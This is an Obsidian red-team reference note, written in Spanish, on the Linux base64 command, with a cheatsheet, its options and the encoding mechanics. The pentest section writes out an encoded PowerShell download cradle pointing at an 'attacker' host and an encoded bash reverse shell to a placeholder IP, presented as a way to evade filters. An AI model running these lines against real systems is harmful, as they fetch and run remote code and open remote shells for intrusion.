---
aliases:
tags:
  - env/linux
  - tool/base64
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Operational Tasks]]"
tertiary categories:
  - "[[Procedures & Methodologies]]"
kind: Tool
linked:
  - "[[JWT Attacks]]"
  - "[[Command Injection - Obfuscacion Avanzada (Case, Reverse, Encoding)]]"
---
# Comando `base64`

> [!info] base64
> Codifica/decodifica datos binarios a texto ASCII (para canales que solo manejan texto). **No cifra, solo codifica** — reversible por cualquiera. Sintaxis: `base64 [opciones] [archivo]`; sin archivo lee de stdin.
^definicion

---

## Cheatsheet

| **Comando** | **Qué obtenés** | **Cuándo** |
|---|---|---|
| `echo -n 'text' \| base64` | Encode | Payload encoding, Basic Auth |
| `echo 'dGV4dA==' \| base64 -d` | Decode | Análisis de tokens, JWT payload |
| `base64 file.bin > file.b64` | Encode archivo | Exfil por canal texto-only |
| `base64 -d file.b64 > file.bin` | Decode archivo | Reconstruir binario |
| `cat file \| base64 -w0` | Encode sin saltos de línea | Single-line para curl/payloads |
^base64-cheatsheet

> **`-n` en `echo` es clave**: sin él, se codifica el `\n` final y el hash/output cambia.

---

## Opciones

| **Flag** | **Qué hace** |
|---|---|
| `-d` / `--decode` | Decodifica |
| `-w N` / `--wrap=N` | Salto de línea cada N chars (default 76; **`-w0`** = sin saltos) |
| `-i` / `--ignore-garbage` | Ignora caracteres inválidos al decodificar |

---

## Casos de Uso (Pentest)

```bash
# Basic Auth header
echo -n 'admin:password' | base64        # → YWRtaW46cGFzc3dvcmQ=
curl -H 'Authorization: Basic YWRtaW46cGFzc3dvcmQ=' http://target

# PowerShell -EncodedCommand (requiere UTF-16LE)
echo -n 'IEX (New-Object Net.WebClient).DownloadString("http://attacker/p.ps1")' \
  | iconv -t UTF-16LE | base64 -w0
# Ejecutar: powershell -EncodedCommand <output>

# Reverse shell encodeada (bypass de filtros)
echo -n 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' | base64
bash -c '{echo,<b64>}|{base64,-d}|{bash,-i}'
```

---

## Cómo funciona

3 bytes (24 bits) → 4 caracteres de 6 bits, mapeados al set `A-Za-z0-9+/`. Padding con `=` si la entrada no es múltiplo de 3. Ej: `Man` → `TWFu`; `Hola` → `SG9sYQ==`.

## Variantes

- **base32**: `echo 'X' | base32` / `base32 -d`.
- **Base64URL**: reemplaza `+ /` por `- _` (seguro en URLs). Usado en **JWT** ([[JWT Attacks]]): `eyJhbGciOiJIUzI1Ni...`.
- **Windows/PowerShell**: requiere `iconv -t UTF-16LE` antes de codificar.

---

## Notas Relacionadas

- [[JWT Attacks]]
- [[Command Injection - Obfuscacion Avanzada (Case, Reverse, Encoding)]]
